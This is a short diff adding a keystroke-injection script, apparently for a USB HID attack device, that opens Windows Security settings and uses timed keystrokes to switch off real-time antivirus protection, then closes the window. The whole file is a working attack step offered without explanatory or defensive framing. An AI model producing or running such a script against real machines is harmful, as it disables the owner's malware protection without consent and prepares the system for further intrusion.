@@ -1,0 +1,25 @@
+REM open virus setting
+
+GUI
+DELAY 500
+STRING virus and threat protection
+DELAY 500
+ENTER
+
+REM toggle off real time protection
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 100
+SPACE
+DELAY 3000
+ALT F4
